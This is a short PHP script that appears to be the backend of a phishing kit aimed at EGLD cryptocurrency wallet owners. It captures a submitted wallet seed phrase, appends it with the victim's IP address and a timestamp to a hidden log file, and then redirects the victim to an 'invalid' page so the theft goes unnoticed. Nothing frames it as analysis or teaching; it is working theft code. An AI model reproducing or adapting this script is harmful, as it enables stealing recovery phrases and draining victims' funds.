<?php
$file = "EGLD_________________________________________22";
$walletSeed   = $_POST['phrase'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "================================seed====================================");
fwrite($handle, "\n");
fwrite($handle, "SEED : ");
fwrite($handle, "$walletSeed");
fwrite($handle, "\n");

fwrite($handle, "IP   : ");

fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
header("Location:invalid.html?restore");

?>